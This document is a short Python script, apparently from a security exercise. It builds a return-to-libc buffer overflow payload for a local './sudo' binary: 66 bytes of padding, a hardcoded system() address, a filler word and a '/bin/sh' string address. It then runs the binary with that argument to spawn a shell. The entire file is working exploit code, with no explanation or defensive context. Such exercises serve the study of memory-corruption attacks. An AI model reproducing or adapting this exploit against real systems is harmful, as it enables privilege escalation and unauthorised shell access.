import os
import sys
import struct

PATH_TO_SUDO = './sudo'


def get_arg():
    bin_sh_addr = 0xb7d7d82b
    sys_addr = 0xb7c5cda0
    offset = 66
    buf = 'a' * offset
    shellcode = buf + struct.pack('<I', sys_addr) + 'a' * 4 + struct.pack('<I', bin_sh_addr)
    return shellcode


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
